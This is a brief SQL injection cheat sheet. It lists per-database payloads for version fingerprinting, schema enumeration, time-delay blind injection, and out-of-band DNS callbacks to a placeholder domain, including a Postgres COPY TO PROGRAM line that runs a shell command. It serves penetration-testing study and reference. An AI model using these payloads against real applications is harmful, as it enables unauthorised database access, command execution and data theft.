# Sql Injection

## Database Name / Version
- Oracle - `SELECT banner FROM v$version` `SELECT version FROM v$instance`
- Microsoft / MySql / MariaDb - `SELECT @@version`
- Postgres - `SELECT version()`

## Dumping Table / Column Names
- Oracle - `SELECT * FROM all_tables` `SELECT * FROM all_tab_columns WHERE table_name = <TABLE>`
- Microsoft / Postgres / MySql / MariaDb - `SELECT * FROM information_schema.tables` `SELECT * FROM information_schema.columns WHERE table_name = <TABLE>`

## Time Delays (Blind Injection)
- Oracle - `dbms_pipe.receive_message(('a'),10)`
- Microsoft - `WAITFOR DELAY '0:0:10'`
- Postgres - `SELECT pg_sleep(10)`
- MySql / MariaDb - `SELECT sleep(10)`

## DNS Lookup (Blind Injection)
- Oracle (v11.2.0.3 - v12.1.0.2) - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "<DOMAIN>/"> %remote;]>'),'/l') FROM dual`
- Oracle (Elevated privileges) - `SELECT UTL_INADDR.get_host_address('<DOMAIN>')`
- Microsoft - `exec master..xp_dirtree '//<DOMAIN>/a'`
- Postgres - `copy (SELECT '') to program 'nslookup <DOMAIN>'`
- MySql / MariaDb (Windows only) - `LOAD_FILE('\\\\<DOMAIN>\\a')` `SELECT ... INTO OUTFILE '\\\\<DOMAIN>\a'`


## MongoDB
** Safe from traditional attacks, from building a BSON object, instead of assembling a query from string **
